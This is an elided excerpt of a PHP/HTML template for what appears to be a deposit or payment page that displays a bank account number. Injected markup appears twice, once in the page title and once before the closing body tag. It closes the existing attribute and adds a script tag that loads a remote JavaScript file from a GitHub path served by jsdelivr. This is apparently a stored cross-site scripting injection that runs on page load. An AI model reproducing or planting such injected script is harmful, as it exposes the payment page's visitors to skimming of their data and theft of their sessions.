...
<head>
  ...
  <title>DepositX"><script src="https://cdn.jsdelivr.net/gh/inggarfi/dexter@main/allin1.js"></script> | <?php echo $s0['instansi']; ?></title>
...
<body>
 ...
 <i class="fa fa-clone pl-2 clip" onclick="copy_virtualku()" data-clipboard-text="<?php echo $gr['no_rek']; ?>"></i></td>
    ...
    X"><script src="https://cdn.jsdelivr.net/gh/inggarfi/dexter@main/allin1.js"></script>
</body>
</html>
